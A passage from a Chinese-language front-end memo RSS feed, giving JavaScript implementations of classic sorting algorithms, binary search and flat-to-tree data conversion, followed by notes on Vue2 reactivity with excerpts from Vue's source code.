        <span>;</span><span>[</span>ary<span>[</span>j<span>]</span><span>,</span> ary<span>[</span>j <span>+</span> <span>1</span><span>]</span><span>]</span> <span>=</span> <span>[</span>ary<span>[</span>j <span>+</span> <span>1</span><span>]</span><span>,</span> ary<span>[</span>j<span>]</span><span>]</span>
      <span>}</span>
    i <span>=</span> pos <span>// 记录下趟排序截止位置</span>
  <span>}</span>
  <span>return</span> ary
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div></li>
<li>
<ol start="2">
<li>选择排序</li>
</ol>
<div><pre><code><span>function</span> <span>selectionSort</span><span>(</span><span>ary</span><span>)</span> <span>{</span>
  <span>let</span> len <span>=</span> ary<span>.</span>length
  <span>let</span> minIndex
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> len <span>-</span> <span>1</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
    minIndex <span>=</span> i
    <span>for</span> <span>(</span><span>let</span> j <span>=</span> i <span>+</span> <span>1</span><span>;</span> j <span>&lt;</span> len<span>;</span> j<span>++</span><span>)</span> <span>{</span>
      <span>// 寻找最小的数，将最小数的索引保存</span>
      <span>if</span> <span>(</span>ary<span>[</span>j<span>]</span> <span>&lt;</span> ary<span>[</span>minIndex<span>]</span><span>)</span> minIndex <span>=</span> j
    <span>}</span>
    <span>;</span><span>[</span>ary<span>[</span>i<span>]</span><span>,</span> ary<span>[</span>minIndex<span>]</span><span>]</span> <span>=</span> <span>[</span>ary<span>[</span>minIndex<span>]</span><span>,</span> ary<span>[</span>i<span>]</span><span>]</span>
  <span>}</span>
  <span>return</span> ary
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div></li>
<li>
<p>3.1 传统插入排序</p>
<div><pre><code><span>function</span> <span>insertionSort</span><span>(</span><span>ary</span><span>)</span> <span>{</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;</span> ary<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    <span>const</span> key <span>=</span> ary<span>[</span>i<span>]</span>
    <span>let</span> j <span>=</span> i <span>-</span> <span>1</span>
    <span>// 依次与已排序数组比较</span>
    <span>while</span> <span>(</span>j <span>>=</span> <span>0</span> <span>&amp;&amp;</span> ary<span>[</span>j<span>]</span> <span>></span> key<span>)</span> <span>{</span>
      ary<span>[</span>j <span>+</span> <span>1</span><span>]</span> <span>=</span> ary<span>[</span>j<span>]</span>
      j<span>--</span>
    <span>}</span>
    ary<span>[</span>j <span>+</span> <span>1</span><span>]</span> <span>=</span> key
  <span>}</span>
  <span>return</span> ary
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div></li>
<li>
<p>3.2 改进插入排序</p>
<blockquote>
<p>查找插入位置时使用二分查找的方式</p>
</blockquote>
<div><pre><code><span>function</span> <span>insertionSort</span><span>(</span><span>ary</span><span>)</span> <span>{</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;</span> ary<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    <span>const</span> key <span>=</span> ary<span>[</span>i<span>]</span>
    <span>// 二分法查找</span>
    <span>let</span> <span>L</span> <span>=</span> <span>0</span><span>,</span>
      <span>R</span> <span>=</span> i <span>-</span> <span>1</span>
    <span>while</span> <span>(</span><span>L</span> <span>&lt;=</span> <span>R</span><span>)</span> <span>{</span>
      <span>let</span> mid <span>=</span> <span>L</span> <span>+</span> <span>(</span><span>(</span><span>R</span> <span>-</span> <span>L</span><span>)</span> <span>>></span> <span>1</span><span>)</span>
      <span>if</span> <span>(</span>key <span>&lt;</span> ary<span>[</span>mid<span>]</span><span>)</span> <span>R</span> <span>=</span> mid <span>-</span> <span>1</span>
      <span>else</span> <span>L</span> <span>=</span> mid <span>+</span> <span>1</span>
    <span>}</span>

    <span>for</span> <span>(</span><span>let</span> j <span>=</span> i <span>-</span> <span>1</span><span>;</span> j <span>>=</span> <span>L</span><span>;</span> j<span>--</span><span>)</span> ary<span>[</span>j <span>+</span> <span>1</span><span>]</span> <span>=</span> ary<span>[</span>j<span>]</span>
    ary<span>[</span><span>L</span><span>]</span> <span>=</span> key
  <span>}</span>
  <span>return</span> ary
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div></li>
<li>
<ol start="4">
<li>希尔排序</li>
</ol>
<div><pre><code><span>function</span> <span>shellSort</span><span>(</span><span>ary</span><span>)</span> <span>{</span>
  <span>const</span> len <span>=</span> ary<span>.</span>length
  <span>let</span> temp<span>,</span>
    gap <span>=</span> <span>1</span>

  <span>// 动态定义间隔序列</span>
  <span>while</span> <span>(</span>gap <span>&lt;</span> len <span>/</span> <span>5</span><span>)</span> gap <span>=</span> gap <span>*</span> <span>5</span> <span>+</span> <span>1</span>
  <span>for</span> <span>(</span>gap<span>;</span> gap <span>></span> <span>0</span><span>;</span> gap <span>=</span> Math<span>.</span><span>floor</span><span>(</span>gap <span>/</span> <span>5</span><span>)</span><span>)</span> <span>{</span>
    <span>// 插入排序</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> gap<span>;</span> i <span>&lt;</span> len<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      temp <span>=</span> ary<span>[</span>i<span>]</span>
      <span>let</span> j <span>=</span> i <span>-</span> gap
      <span>for</span> <span>(</span><span>;</span> j <span>>=</span> <span>0</span> <span>&amp;&amp;</span> ary<span>[</span>j<span>]</span> <span>></span> temp<span>;</span> j <span>-=</span> gap<span>)</span> <span>{</span>
        ary<span>[</span>j <span>+</span> gap<span>]</span> <span>=</span> ary<span>[</span>j<span>]</span>
      <span>}</span>
      ary<span>[</span>j <span>+</span> gap<span>]</span> <span>=</span> temp
    <span>}</span>
  <span>}</span>
  <span>return</span> ary
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div></li>
<li>
<ol start="5">
<li>归并排序</li>
</ol>
<div><pre><code><span>function</span> <span>mergeSort</span><span>(</span><span>ary</span><span>)</span> <span>{</span>
  <span>// 采用自上而下的递归方法</span>
  <span>const</span> len <span>=</span> ary<span>.</span>length
  <span>if</span> <span>(</span>len <span>&lt;</span> <span>2</span><span>)</span> <span>return</span> ary
  <span>const</span> mid <span>=</span> len <span>>></span> <span>1</span><span>,</span>
    left <span>=</span> ary<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> mid<span>)</span><span>,</span>
    right <span>=</span> ary<span>.</span><span>slice</span><span>(</span>mid<span>)</span>
  <span>return</span> <span>merge</span><span>(</span><span>mergeSort</span><span>(</span>left<span>)</span><span>,</span> <span>mergeSort</span><span>(</span>right<span>)</span><span>)</span>
<span>}</span>

<span>function</span> <span>merge</span><span>(</span><span>left<span>,</span> right</span><span>)</span> <span>{</span>
  <span>const</span> res <span>=</span> <span>[</span><span>]</span>
  <span>while</span> <span>(</span>left<span>.</span>length <span>&amp;&amp;</span> right<span>.</span>length<span>)</span> <span>{</span>
    <span>if</span> <span>(</span>left<span>[</span><span>0</span><span>]</span> <span>&lt;=</span> right<span>[</span><span>0</span><span>]</span><span>)</span> res<span>.</span><span>push</span><span>(</span>left<span>.</span><span>shift</span><span>(</span><span>)</span><span>)</span>
    <span>else</span> res<span>.</span><span>push</span><span>(</span>right<span>.</span><span>shift</span><span>(</span><span>)</span><span>)</span>
  <span>}</span>
  <span>while</span> <span>(</span>left<span>.</span>length<span>)</span> res<span>.</span><span>push</span><span>(</span>left<span>.</span><span>shift</span><span>(</span><span>)</span><span>)</span>
  <span>while</span> <span>(</span>right<span>.</span>length<span>)</span> res<span>.</span><span>push</span><span>(</span>right<span>.</span><span>shift</span><span>(</span><span>)</span><span>)</span>
  <span>return</span> res
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div></li>
<li>
<ol start="6">
<li>快速排序</li>
</ol>
<div><pre><code><span>function</span> <span>quickSort</span><span>(</span><span>ary</span><span>)</span> <span>{</span>
  <span>const</span> len <span>=</span> ary<span>.</span>length
  <span>if</span> <span>(</span>len <span>&lt;</span> <span>2</span><span>)</span> <span>return</span> ary
  <span>// 找基准，并把基准从原数组删除保存在变量pivot</span>
  <span>const</span> pivotIndex <span>=</span> len <span>>></span> <span>1</span>
  <span>const</span> pivot <span>=</span> ary<span>.</span><span>splice</span><span>(</span>pivotIndex<span>,</span> <span>1</span><span>)</span><span>[</span><span>0</span><span>]</span>
  <span>// 定义左右数组</span>
  <span>const</span> left <span>=</span> <span>[</span><span>]</span><span>,</span>
    right <span>=</span> <span>[</span><span>]</span>
  <span>// 比基准小的放在left，比基准大的放在right</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> ary<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>ary<span>[</span>i<span>]</span> <span>&lt;=</span> pivot<span>)</span> left<span>.</span><span>push</span><span>(</span>ary<span>[</span>i<span>]</span><span>)</span>
    <span>else</span> right<span>.</span><span>push</span><span>(</span>ary<span>[</span>i<span>]</span><span>)</span>
  <span>}</span>
  <span>// 拼接数组并分别递归</span>
  <span>return</span> <span>quickSort</span><span>(</span>left<span>)</span><span>.</span><span>concat</span><span>(</span><span>[</span>pivot<span>]</span><span>,</span> <span>quickSort</span><span>(</span>right<span>)</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div></li>
<li>
<ol start="7">
<li>堆排序</li>
</ol>
<div><pre><code><span>function</span> <span>heapSort</span><span>(</span><span>ary</span><span>)</span> <span>{</span>
  <span>// 建堆</span>
  <span>let</span> heapSize <span>=</span> ary<span>.</span>length
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>(</span>heapSize <span>>></span> <span>1</span><span>)</span> <span>-</span> <span>1</span><span>;</span> i <span>>=</span> <span>0</span><span>;</span> i<span>--</span><span>)</span> <span>{</span>
    <span>heapify</span><span>(</span>ary<span>,</span> i<span>,</span> heapSize<span>)</span>
  <span>}</span>
  <span>// 排序</span>
  <span>for</span> <span>(</span><span>let</span> j <span>=</span> heapSize <span>-</span> <span>1</span><span>;</span> j <span>>=</span> <span>1</span><span>;</span> j<span>--</span><span>)</span> <span>{</span>
    <span>;</span><span>[</span>ary<span>[</span><span>0</span><span>]</span><span>,</span> ary<span>[</span>j<span>]</span><span>]</span> <span>=</span> <span>[</span>ary<span>[</span>j<span>]</span><span>,</span> ary<span>[</span><span>0</span><span>]</span><span>]</span>
    <span>heapify</span><span>(</span>ary<span>,</span> <span>0</span><span>,</span> <span>--</span>heapSize<span>)</span>
  <span>}</span>
  <span>return</span> ary
<span>}</span>

<span>function</span> <span>heapify</span><span>(</span><span>ary<span>,</span> x<span>,</span> len</span><span>)</span> <span>{</span>
  <span>const</span> <span>L</span> <span>=</span> <span>2</span> <span>*</span> x <span>+</span> <span>1</span><span>,</span>
    <span>R</span> <span>=</span> <span>2</span> <span>*</span> x <span>+</span> <span>2</span>
  <span>let</span> largest <span>=</span> x
  <span>if</span> <span>(</span><span>L</span> <span>&lt;</span> len <span>&amp;&amp;</span> ary<span>[</span><span>L</span><span>]</span> <span>></span> ary<span>[</span>largest<span>]</span><span>)</span> largest <span>=</span> <span>L</span>
  <span>if</span> <span>(</span><span>R</span> <span>&lt;</span> len <span>&amp;&amp;</span> ary<span>[</span><span>R</span><span>]</span> <span>></span> ary<span>[</span>largest<span>]</span><span>)</span> largest <span>=</span> <span>R</span>
  <span>if</span> <span>(</span>largest <span>!==</span> x<span>)</span> <span>{</span>
    <span>;</span><span>[</span>ary<span>[</span>x<span>]</span><span>,</span> ary<span>[</span>largest<span>]</span><span>]</span> <span>=</span> <span>[</span>ary<span>[</span>largest<span>]</span><span>,</span> ary<span>[</span>x<span>]</span><span>]</span>
    <span>heapify</span><span>(</span>ary<span>,</span> largest<span>,</span> len<span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div></li>
<li>
<p><a href="https://juejin.cn/post/6844903444365443080" target="_blank" rel="noopener noreferrer">十大经典排序算法总结 - Damonare</a></p>
<img :src="$withBase('/images/Basic-Algorithm/sort-algorithm.png')" loading="lazy">
</li>
</ul>
<h2 id="_6-二分法查找"> 6. 二分法查找</h2>
<div><pre><code><span>function</span> <span>binarySearch</span><span>(</span><span>ary<span>,</span> target</span><span>)</span> <span>{</span>
  <span>let</span> <span>L</span> <span>=</span> <span>0</span><span>,</span>
    <span>R</span> <span>=</span> ary<span>.</span>length

  <span>while</span> <span>(</span><span>L</span> <span>&lt;=</span> <span>R</span><span>)</span> <span>{</span>
    <span>let</span> mid <span>=</span> <span>L</span> <span>+</span> <span>(</span><span>(</span><span>R</span> <span>-</span> <span>L</span><span>)</span> <span>>></span> <span>1</span><span>)</span>
    <span>if</span> <span>(</span>target <span>===</span> ary<span>[</span>mid<span>]</span><span>)</span> <span>return</span> mid
    <span>else</span> <span>if</span> <span>(</span>target <span>&lt;</span> ary<span>[</span>mid<span>]</span><span>)</span> <span>R</span> <span>=</span> mid <span>-</span> <span>1</span>
    <span>else</span> <span>L</span> <span>=</span> mid <span>+</span> <span>1</span>
  <span>}</span>

  <span>return</span> <span>-</span><span>1</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_7-树形数据结构化"> 7. 树形数据结构化</h2>
<div><pre><code><span>const</span> ary <span>=</span> <span>[</span>
  <span>{</span>
    <span>id</span><span>:</span> <span>1</span><span>,</span>
    <span>pid</span><span>:</span> <span>0</span><span>,</span>
    <span>title</span><span>:</span> <span>'jack'</span><span>,</span>
  <span>}</span><span>,</span>
  <span>{</span>
    <span>id</span><span>:</span> <span>2</span><span>,</span>
    <span>pid</span><span>:</span> <span>0</span><span>,</span>
    <span>title</span><span>:</span> <span>'pony'</span><span>,</span>
  <span>}</span><span>,</span>
  <span>{</span>
    <span>id</span><span>:</span> <span>3</span><span>,</span>
    <span>pid</span><span>:</span> <span>1</span><span>,</span>
    <span>title</span><span>:</span> <span>'Evan You'</span><span>,</span>
  <span>}</span><span>,</span>
  <span>{</span>
    <span>id</span><span>:</span> <span>4</span><span>,</span>
    <span>pid</span><span>:</span> <span>3</span><span>,</span>
    <span>title</span><span>:</span> <span>'coderljw'</span><span>,</span>
  <span>}</span><span>,</span>
<span>]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><ul>
<li>
<ol>
<li>递归</li>
</ol>
</li>
</ul>
<div><pre><code><span>function</span> <span>formatDataTree</span><span>(</span><span>ary</span><span>)</span> <span>{</span>
  <span>const</span> parents <span>=</span> ary<span>.</span><span>filter</span><span>(</span><span>p</span> <span>=></span> p<span>.</span>pid <span>===</span> <span>0</span><span>)</span><span>,</span>
    children <span>=</span> ary<span>.</span><span>filter</span><span>(</span><span>c</span> <span>=></span> c<span>.</span>pid <span>!==</span> <span>0</span><span>)</span>

  <span>aryToTree</span><span>(</span>parents<span>,</span> children<span>)</span>
  <span>return</span> parents

  <span>function</span> <span>aryToTree</span><span>(</span><span>parents<span>,</span> children</span><span>)</span> <span>{</span>
    parents<span>.</span><span>map</span><span>(</span><span>p</span> <span>=></span> <span>{</span>
      children<span>.</span><span>forEach</span><span>(</span><span>(</span><span>c<span>,</span> i</span><span>)</span> <span>=></span> <span>{</span>
        <span>if</span> <span>(</span>p<span>.</span>id <span>===</span> c<span>.</span>pid<span>)</span> <span>{</span>
          <span>if</span> <span>(</span>p<span>.</span>children<span>)</span> p<span>.</span>children<span>.</span><span>push</span><span>(</span>c<span>)</span>
          <span>else</span> p<span>.</span>children <span>=</span> <span>[</span>c<span>]</span>
          <span>aryToTree</span><span>(</span>p<span>.</span>children<span>,</span> children<span>)</span>
        <span>}</span>
      <span>}</span><span>)</span>
    <span>}</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><ul>
<li>
<ol start="2">
<li>扁平化处理</li>
</ol>
</li>
</ul>
<div><pre><code><span>const</span> tree <span>=</span> ary<span>.</span><span>filter</span><span>(</span><span>p</span> <span>=></span> <span>{</span>
  <span>const</span> children <span>=</span> ary<span>.</span><span>filter</span><span>(</span><span>c</span> <span>=></span> p<span>.</span>id <span>===</span> c<span>.</span>pid<span>)</span>
  children<span>.</span>length <span>&amp;&amp;</span> <span>(</span>p<span>.</span>children <span>=</span> children<span>)</span>
  <span>return</span> p<span>.</span>pid <span>===</span> <span>0</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Vue</title>
      <link>https://www.matrixtheone.ga/web/memo/Vue/</link>
      <guid>https://www.matrixtheone.ga/web/memo/Vue/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Vue</source>
      <category>Vue</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-数据响应式"> 1. 数据响应式</h2>
<ul>
<li>
<p>Vue2 的数据响应式依赖 Object.defineProperty（Vue3 采用 Proxy）和发布订阅模式。</p>
<img :src="$withBase('/images/Vue/Vue-reactivity.png')" loading="lazy">
</li>
<li>
<ol>
<li>数据初始化时定义响应式对象：initState -- &gt; observe -- &gt; defineReactive -&gt; Object.defineProperty</li>
</ol>
<blockquote>
<ul>
<li><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/instance/state.js#L49-L63" target="_blank" rel="noopener noreferrer">src/core/instance/state</a></li>
<li><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/observer/index.js" target="_blank" rel="noopener noreferrer">src/core/observer/index</a></li>
</ul>
</blockquote>
<div><pre><code><span>export</span> <span>function</span> <span>defineReactive</span><span>(</span>
  <span><span>obj</span><span>:</span> Object<span>,</span>
  <span>key</span><span>:</span> string<span>,</span>
  <span>val</span><span>:</span> any<span>,</span>
  customSetter<span>?</span><span>:</span> <span>?</span>Function<span>,</span>
  shallow<span>?</span><span>:</span> boolean</span>
<span>)</span> <span>{</span>
  <span>const</span> dep <span>=</span> <span>new</span> <span>Dep</span><span>(</span><span>)</span>
  <span>// ...</span>

  <span>let</span> childOb <span>=</span> <span>!</span>shallow <span>&amp;&amp;</span> <span>observe</span><span>(</span>val<span>)</span>
  Object<span>.</span><span>defineProperty</span><span>(</span>obj<span>,</span> key<span>,</span> <span>{</span>
    <span>enumerable</span><span>:</span> <span>true</span><span>,</span>
    <span>configurable</span><span>:</span> <span>true</span><span>,</span>
    <span>get</span><span>:</span> <span>function</span> <span>reactiveGetter</span><span>(</span><span>)</span> <span>{</span>
      <span>// ...</span>

      <span>// 收集依赖：添加订阅者（watcher）</span>
      <span>if</span> <span>(</span>Dep<span>.</span>target<span>)</span> <span>{</span>
        dep<span>.</span><span>depend</span><span>(</span><span>)</span>
        <span>if</span> <span>(</span>childOb<span>)</span> <span>{</span>
          childOb<span>.</span>dep<span>.</span><span>depend</span><span>(</span><span>)</span>
          <span>if</span> <span>(</span>Array<span>.</span><span>isArray</span><span>(</span>value<span>)</span><span>)</span> <span>{</span>
            <span>dependArray</span><span>(</span>value<span>)</span>
          <span>}</span>
        <span>}</span>
      <span>}</span>
      <span>return</span> value
    <span>}</span><span>,</span>
    <span>set</span><span>:</span> <span>function</span> <span>reactiveSetter</span><span>(</span><span>newVal</span><span>)</span> <span>{</span>
      <span>// ...</span>

      <span>// 派发更新：通知订阅者（watcher）</span>
      dep<span>.</span><span>notify</span><span>(</span><span>)</span>
    <span>}</span><span>,</span>
  <span>}</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br></div></div></li>
<li>
<ol start="2">
<li>挂载组件时收集依赖：mountComponent -&gt; vm._update(vm._render(), hydrating)，在解析模板生成 ast 时会标记 vm 上的数据，执行 render 函数时会访问改数据（getter）。</li>
</ol>
<blockquote>
<p><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/instance/lifecycle.js#L189-L203" target="_blank" rel="noopener noreferrer">src/core/instance/lifecycle</a></p>
</blockquote>
<div><pre><code><span>export</span> <span>function</span> <span>mountComponent</span><span>(</span>
  <span><span>vm</span><span>:</span> Component<span>,</span>
  <span>el</span><span>:</span> <span>?</span>Element<span>,</span>
  hydrating<span>?</span><span>:</span> boolean</span>
<span>)</span><span>:</span> Component <span>{</span>
  <span>// ...</span>

  <span>let</span> updateComponent
  <span>if</span> <span>(</span><span>)</span> <span>{</span>
    <span>// ...</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>// 更新组件（patch）</span>
    <span>updateComponent</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      vm<span>.</span><span>_update</span><span>(</span>vm<span>.</span><span>_render</span><span>(</span><span>)</span><span>,</span> hydrating<span>)</span>
    <span>}</span>
  <span>}</span>

  <span>// 每个组件都有一个对应的 RenderWatcher</span>
  <span>new</span> <span>Watcher</span><span>(</span>
    vm<span>,</span>
    updateComponent<span>,</span>
    noop<span>,</span>
    <span>{</span>
      <span>before</span><span>(</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>vm<span>.</span>_isMounted <span>&amp;&amp;</span> <span>!</span>vm<span>.</span>_isDestroyed<span>)</span> <span>{</span>
          <span>callHook</span><span>(</span>vm<span>,</span> <span>'beforeUpdate'</span><span>)</span>
        <span>}</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
    <span>true</span> <span>/* isRenderWatcher */</span>
  <span>)</span>
  <span>// ...</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br></div></div></li>
<li>
<ol start="3">
<li>改变响应式对象的属性时派发更新：setter（Object.defineProperty） -&gt; dep.notify -&gt; watcher.update -&gt; queueWatcher -&gt; nextTick -&gt; flushSchedulerQueue -&gt; watcher.run -&gt; watcher.get -&gt; watcher.getter -&gt; updateComponent -&gt; vm._update(vm._render(), hydrating)，最终 patch 后更新视图。</li>
</ol>
<blockquote>
<p><a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/observer/scheduler.js#L71-L128" target="_blank" rel="noopener noreferrer">src/core/observer/scheduler</a></p>
</blockquote>
<div><pre><code><span>function</span> <span>flushSchedulerQueue</span><span>(</span><span>)</span> <span>{</span>
  <span>// ...</span>

  <span>// 队列排序</span>
  queue<span>.</span><span>sort</span><span>(</span><span>(</span><span>a<span>,</span> b</span><span>)</span> <span>=></span> a<span>.</span>id <span>-</span> b<span>.</span>id<span>)</span>

  <span>for</span> <span>(</span>index <span>=</span> <span>0</span><span>;</span> index <span>&lt;</span> queue<span>.</span>length<span>;</span> index<span>++</span><span>)</span> <span>{</span>
    <span>// ...</span>

    <span>// 执行 run</span>
    watcher<span>.</span><span>run</span><span>(</span><span>)</span>
    <span>// ...</span>
  <span>}</span>

  <span>// ...</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div></li>
<li>
<p>Vue2 中 Array 为非响应式对象，Vue3 使用 Proxy 不会有此限制。</p>
<blockquote>
<ol>
<li>Array.length 的 configurable 默认为 false（不可重新配置），也就不能使用 Object.defineProperty 重新定义 length 为响应式。vm.items[overflowLength] = value 及原生 push、pop 等可改变原数组长度的方法也就不能触发视图更新，而 Vue 重写了这些原生方法，在其中手动通知视图更新（<a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/observer/array.js#L42" target="_blank" rel="noopener noreferrer">src/core/observer/array</a>）。</li>
<li>vm.items[indexOfItem] = newValue 不使用 Object.defineProperty 定义为响应式对象，是由于性能代价和获得的用户体验收益不成正比（<a href="https://github.com/vuejs/vue/issues/8562" target="_blank" rel="noopener noreferrer">为什么 vue 没有提供对数组属性的监听</a>）。Vue 提供 Vue.set（vm.$set）、Vue.delete（vm.$delete）方法，在其中手动通知视图更新（<a href="https://github.com/vuejs/vue/blob/v2.6.14/src/core/observer/index.js#L201-L262" target="_blank" rel="noopener noreferrer">src/core/observer/index</a>）。</li>
</ol>
</blockquote>
</li>
<li>
<p><a href="https://www.bilibili.com/video/BV1d4411v7UX" target="_blank" rel="noopener noreferrer">Evan You</a></p>
<div><pre><code><span>function</span> <span>isObject</span><span>(</span><span>obj</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span>typeof</span> obj <span>===</span> <span>'object'</span> <span>&amp;&amp;</span>
    <span>!</span>Array<span>.</span><span>isArray</span><span>(</span>obj<span>)</span> <span>&amp;&amp;</span>
    obj <span>!==</span> <span>null</span> <span>&amp;&amp;</span>
    obj <span>!==</span> <span>undefined</span>
  <span>)</span>
<span>}</span>

<span>function</span> <span>observe</span><span>(</span><span>obj</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>isObject</span><span>(</span>obj<span>)</span><span>)</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>TypeError</span><span>(</span><span>)</span>
  <span>}</span>

  Object<span>.</span><span>keys</span><span>(</span>obj<span>)</span><span>.</span><span>forEach</span><span>(</span><span>key</span> <span>=></span> <span>{</span>
    <span>let</span> internalValue <span>=</span> obj<span>[</span>key<span>]</span>
    <span>let</span> dep <span>=</span> <span>new</span> <span>Dep</span><span>(</span><span>)</span>
    Object<span>.</span><span>defineProperty</span><span>(</span>obj<span>,</span> key<span>,</span> <span>{</span>
      <span>get</span><span>(</span><span>)</span> <span>{</span>
        dep<span>.</span><span>depend</span><span>(</span><span>)</span>
        <span>return</span> internalValue
      <span>}</span><span>,</span>
      <span>set</span><span>(</span>newValue<span>)</span> <span>{</span>
        <span>const</span> isChanged <span>=</span> internalValue <span>!==</span> newValue
        <span>if</span> <span>(</span>isChanged<span>)</span> <span>{</span>
          internalValue <span>=</span> newValue
